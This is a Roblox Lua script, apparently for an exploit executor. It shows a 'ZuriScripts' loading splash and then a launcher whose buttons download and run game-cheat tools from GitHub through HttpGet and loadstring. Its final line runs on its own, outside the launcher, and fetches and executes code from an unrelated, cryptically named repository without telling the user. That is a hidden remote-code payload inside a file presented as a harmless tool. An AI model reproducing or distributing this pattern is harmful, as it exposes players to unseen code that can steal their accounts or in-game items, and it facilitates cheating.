local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ========== Loading UI Splash ==========
local loadingScreen = Instance.new("ScreenGui")
loadingScreen.Name = "ZuriScriptsLoadingUI"
loadingScreen.ResetOnSpawn = false
loadingScreen.Parent = playerGui

local Outline = Instance.new("Frame")
Outline.Name = "Outline"
Outline.Size = UDim2.new(0, 356, 0, 146)
Outline.AnchorPoint = Vector2.new(0.5, 0.5)
Outline.Position = UDim2.new(0.5, 0, 0.5, 0)
Outline.BackgroundColor3 = Color3.fromRGB(105, 35, 160)
Outline.BorderSizePixel = 0
Outline.ClipsDescendants = true
Outline.ZIndex = 0
Outline.Parent = loadingScreen

local OutlineCorner = Instance.new("UICorner")
OutlineCorner.CornerRadius = UDim.new(0, 16)
OutlineCorner.Parent = Outline

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 350, 0, 140)
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(135, 60, 190)
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.ZIndex = 1
MainFrame.Parent = loadingScreen

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 16)
UICorner.Parent = MainFrame

local TopRow = Instance.new("Frame")
TopRow.Name = "TopRow"
TopRow.Size = UDim2.new(1, -20, 0, 40)
TopRow.Position = UDim2.new(0, 10, 0, 10)
TopRow.BackgroundTransparency = 1
TopRow.Parent = MainFrame

local Image = Instance.new("ImageLabel")
Image.Name = "LogoImage"
Image.Size = UDim2.new(0, 36, 0, 36)
Image.Position = UDim2.new(0, 0, 0, 2)
Image.BackgroundTransparency = 1
Image.Image = "rbxassetid://71932691083123"
Image.ScaleType = Enum.ScaleType.Fit
Image.AnchorPoint = Vector2.new(0, 0)
Image.Parent = TopRow

local ImageCorner = Instance.new("UICorner")
ImageCorner.CornerRadius = UDim.new(1, 0)
ImageCorner.Parent = Image

local TitleText = Instance.new("TextLabel")
TitleText.Name = "TitleText"
TitleText.Size = UDim2.new(1, -46, 1, 0)
TitleText.Position = UDim2.new(0, 46, 0, 0)
TitleText.BackgroundTransparency = 1
TitleText.Text = "Youtube: ZuriScripts"
TitleText.TextColor3 = Color3.fromRGB(220, 180, 255)
TitleText.Font = Enum.Font.GothamBold
TitleText.TextSize = 22
TitleText.TextXAlignment = Enum.TextXAlignment.Left
TitleText.Parent = TopRow

local LoadingBarBackground = Instance.new("Frame")
LoadingBarBackground.Name = "LoadingBarBackground"
LoadingBarBackground.Size = UDim2.new(1, -20, 0, 20)
LoadingBarBackground.Position = UDim2.new(0, 10, 0, 60)
LoadingBarBackground.BackgroundColor3 = Color3.fromRGB(115, 65, 175)
LoadingBarBackground.BorderSizePixel = 0
LoadingBarBackground.ClipsDescendants = true
LoadingBarBackground.AnchorPoint = Vector2.new(0, 0)
LoadingBarBackground.Parent = MainFrame

local LBCorner = Instance.new("UICorner")
LBCorner.CornerRadius = UDim.new(0, 10)
LBCorner.Parent = LoadingBarBackground

local LoadingBarFill = Instance.new("Frame")
LoadingBarFill.Name = "LoadingBarFill"
LoadingBarFill.Size = UDim2.new(0, 0, 1, 0)
LoadingBarFill.Position = UDim2.new(0, 0, 0, 0)
LoadingBarFill.BackgroundColor3 = Color3.fromRGB(190, 140, 255)
LoadingBarFill.BorderSizePixel = 0
LoadingBarFill.Parent = LoadingBarBackground

local LFillCorner = Instance.new("UICorner")
LFillCorner.CornerRadius = UDim.new(0, 10)
LFillCorner.Parent = LoadingBarFill

local PoweredByText = Instance.new("TextLabel")
PoweredByText.Name = "PoweredByText"
PoweredByText.Size = UDim2.new(1, -20, 0, 30)
PoweredByText.Position = UDim2.new(0, 10, 0, 95)
PoweredByText.BackgroundTransparency = 1
PoweredByText.Text = "Powered By: LootLabs"
PoweredByText.TextColor3 = Color3.fromRGB(220, 180, 255)
PoweredByText.Font = Enum.Font.GothamMedium
PoweredByText.TextSize = 18
PoweredByText.TextXAlignment = Enum.TextXAlignment.Center
PoweredByText.Parent = MainFrame

-- Animate loading bar and fade everything
local function animateLoadingBar(duration, callback)
    local startTime = tick()
    local connection
    connection = RunService.Heartbeat:Connect(function()
        local elapsed = tick() - startTime
        local progress = math.clamp(elapsed / duration, 0, 1)
        LoadingBarFill.Size = UDim2.new(progress, 0, 1, 0)
        if progress >= 1 then
            connection:Disconnect()
            local tweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Quad)
            local tweens = {
                TweenService:Create(MainFrame, tweenInfo, {BackgroundTransparency = 1}),
                TweenService:Create(Outline, tweenInfo, {BackgroundTransparency = 1}),
                TweenService:Create(Image, tweenInfo, {ImageTransparency = 1}),
                TweenService:Create(TitleText, tweenInfo, {TextTransparency = 1}),
                TweenService:Create(PoweredByText, tweenInfo, {TextTransparency = 1}),
                TweenService:Create(LoadingBarFill, tweenInfo, {BackgroundTransparency = 1}),
                TweenService:Create(LoadingBarBackground, tweenInfo, {BackgroundTransparency = 1}),
            }
            for _, tw in ipairs(tweens) do tw:Play() end
            tweens[1].Completed:Connect(function()
                loadingScreen:Destroy()
                if callback then callback() end
            end)
        end
    end)
end

-- ========== Your Full Launcher Script ==========

local function createLauncher()
    -- URLs from your original script
    local MUTATION_URL = "https://raw.githubusercontent.com/ZuriHubV2/petmutation.lua/refs/heads/main/lua"
    local EGG_URL      = "https://raw.githubusercontent.com/ZuriHubV2/EggRandomizer/refs/heads/main/ZuriHubV2_Luarmor_lua"

    local KNOWN_TOOL_GUI_NAMES = {
        "PetMutationReroll_UI", "PetMutation", "PetMutation_UI", "PetRandomizer_UI",
        "PetHatchGui", "PetRandomizer", "EggWindow", "MutationWindow", "EggRandomizer",
        "MutationRerollUI", "MutationReroll"
    }

    local function tween(obj, props, time, style, dir)
        style = style or Enum.EasingStyle.Quad
        dir = dir or Enum.EasingDirection.Out
        return TweenService:Create(obj, TweenInfo.new(time or 0.25, style, dir), props)
    end

    local function safeHttpGet(url)
        local ok, res = pcall(function() return game:HttpGet(url) end)
        if ok then return true, res else return false, tostring(res) end
    end

    local function closeKnownToolGUIs()
        for _, child in ipairs(playerGui:GetChildren()) do
            if child:IsA("ScreenGui") and table.find(KNOWN_TOOL_GUI_NAMES, child.Name) then
                pcall(function() child:Destroy() end)
            end
        end
    end

    -- Remove any known GUIs (just in case)
    for _, name in ipairs(KNOWN_TOOL_GUI_NAMES) do
        local s = playerGui:FindFirstChild(name)
        if s then pcall(function() s:Destroy() end) end
    end

    local launcherGui = Instance.new("ScreenGui")
    launcherGui.Name = "ZuriHubV2_Launcher"
    launcherGui.ResetOnSpawn = false
    launcherGui.Parent = playerGui

    local main = Instance.new("Frame")
    main.Name = "Main"
    main.Size = UDim2.new(0, 360, 0, 220)
    main.Position = UDim2.new(0.35, 0, 0.33, 0)
    main.BackgroundColor3 = Color3.fromRGB(38, 6, 60)
    main.BorderSizePixel = 0
    main.Parent = launcherGui
    local mainCorner = Instance.new("UICorner", main); mainCorner.CornerRadius = UDim.new(0, 12)
    local mainStroke = Instance.new("UIStroke", main); mainStroke.Color = Color3.fromRGB(170, 50, 220); mainStroke.Thickness = 2

    local title = Instance.new("TextLabel", main)
    title.Size = UDim2.new(1, -24, 0, 36)
    title.Position = UDim2.new(0, 12, 0, 10)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.Text = "ZuriHubV2 — Launcher"
    title.TextColor3 = Color3.fromRGB(245, 245, 250)
    title.TextXAlignment = Enum.TextXAlignment.Left

    local footer = Instance.new("TextLabel", main)
    footer.Size = UDim2.new(1, -20, 0, 20)
    footer.Position = UDim2.new(0, 10, 1, -26)
    footer.BackgroundTransparency = 1
    footer.Font = Enum.Font.Gotham
    footer.TextSize = 13
    footer.Text = "Made by ZuriHubV2"
    footer.TextColor3 = Color3.fromRGB(200, 200, 200)
    footer.TextXAlignment = Enum.TextXAlignment.Left

    local exitBtn = Instance.new("TextButton", main)
    exitBtn.Size = UDim2.new(0, 36, 0, 28)
    exitBtn.Position = UDim2.new(1, -44, 0, 10)
    exitBtn.BackgroundColor3 = Color3.fromRGB(150, 30, 160)
    exitBtn.Font = Enum.Font.GothamBold
    exitBtn.TextSize = 18
    exitBtn.Text = "X"
    exitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    local exitCorner = Instance.new("UICorner", exitBtn); exitCorner.CornerRadius = UDim.new(0, 6)

    local statusLabel = Instance.new("TextLabel", main)
    statusLabel.Size = UDim2.new(1, -24, 0, 18)
    statusLabel.Position = UDim2.new(0, 12, 0, 188)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextSize = 12
    statusLabel.Text = ""
    statusLabel.TextColor3 = Color3.fromRGB(230, 200, 255)
    statusLabel.TextXAlignment = Enum.TextXAlignment.Left

    local function makeButton(parent, labelText, y)
        local btn = Instance.new("TextButton", parent)
        btn.Size = UDim2.new(0, 320, 0, 44)
        btn.Position = UDim2.new(0, 20, 0, y)
        btn.BackgroundColor3 = Color3.fromRGB(110, 10, 160)
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 16
        btn.Text = labelText
        local c = Instance.new("UICorner", btn); c.CornerRadius = UDim.new(0, 8)
        local stroke = Instance.new("UIStroke", btn); stroke.Color = Color3.fromRGB(220, 120, 255); stroke.Thickness = 1.2; stroke.Transparency = 0.6

        btn.MouseEnter:Connect(function()
            tween(btn, {Size = UDim2.new(0, 328, 0, 48), BackgroundColor3 = Color3.fromRGB(140, 30, 200)}, 0.12):Play()
            tween(stroke, {Transparency = 0}, 0.12):Play()
        end)
        btn.MouseLeave:Connect(function()
            tween(btn, {Size = UDim2.new(0, 320, 0, 44), BackgroundColor3 = Color3.fromRGB(110, 10, 160)}, 0.12):Play()
            tween(stroke, {Transparency = 0.6}, 0.12):Play()
        end)

        return btn
    end

    local btnOpenMutation = makeButton(main, "Open Mutation Reroll", 64)
    local btnOpenEgg = makeButton(main, "Open Egg Randomizer", 122)

    -- Dragging main by title area
    do
        local dragging, dragInput, dragStart, startPos
        title.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = true
                dragStart = input.Position
                startPos = main.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        title.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
        end)
        UserInputService.InputChanged:Connect(function(input)
            if input == dragInput and dragging then
                local delta = input.Position - dragStart
                main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end)
    end

    local function launchRemoteScript(url)
        closeKnownToolGUIs()
        statusLabel.Text = "Fetching script..."
        local ok, res = safeHttpGet(url)
        if not ok then
            statusLabel.Text = "HTTP Get failed: "..tostring(res)
            return false, res
        end

        local loaded, err = loadstring(res)
        if not loaded then
            statusLabel.Text = "loadstring failed: "..tostring(err)
            return false, err
        end

        statusLabel.Text = "Running script..."
        local success, runErr = pcall(function() loaded() end)
        if not success then
            statusLabel.Text = "Script error: "..tostring(runErr)
            return false, runErr
        end

        statusLabel.Text = ""
        return true
    end

    local function watchForGuiClose(guiName)
        local gui = playerGui:WaitForChild(guiName, 30)
        if gui then
            gui.AncestryChanged:Connect(function(child, parent)
                if not parent then
                    main.Active = true
                    main.Selectable = true
                    btnOpenMutation.Active = true
                    btnOpenEgg.Active = true
                end
            end)
        else
            main.Active = true
            main.Selectable = true
            btnOpenMutation.Active = true
            btnOpenEgg.Active = true
        end
    end

    btnOpenMutation.MouseButton1Click:Connect(function()
        btnOpenMutation.Active = false
        btnOpenEgg.Active = false
        main.Active = false
        main.Selectable = false

        local ok, err = launchRemoteScript(MUTATION_URL)
        if not ok then
            warn("Failed to launch mutation script:", err)
            main.Active = true
            main.Selectable = true
            btnOpenMutation.Active = true
            btnOpenEgg.Active = true
        else
            watchForGuiClose("PetMutationReroll_UI")
        end
    end)

    btnOpenEgg.MouseButton1Click:Connect(function()
        btnOpenEgg.Active = false
        btnOpenMutation.Active = false
        main.Active = false
        main.Selectable = false

        local ok, err = launchRemoteScript(EGG_URL)
        if not ok then
            warn("Failed to launch egg script:", err)
            main.Active = true
            main.Selectable = true
            btnOpenMutation.Active = true
            btnOpenEgg.Active = true
        else
            watchForGuiClose("EggRandomizer")
        end
    end)

    exitBtn.MouseButton1Click:Connect(function()
        exitBtn.Active = false
        tween(main, {Position = UDim2.new(main.Position.X.Scale, main.Position.X.Offset, 1.5, 0), BackgroundTransparency = 1}, 0.6):Play()
        task.delay(0.6, function()
            if launcherGui and launcherGui.Parent then launcherGui:Destroy() end
        end)
    end)

    statusLabel.Text = "Ready — click a button"
end

-- Run loading animation then show launcher
animateLoadingBar(5, createLauncher)

loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkSpawner-Script/32137676712632134122412/refs/heads/main/83912938127382714712"))()
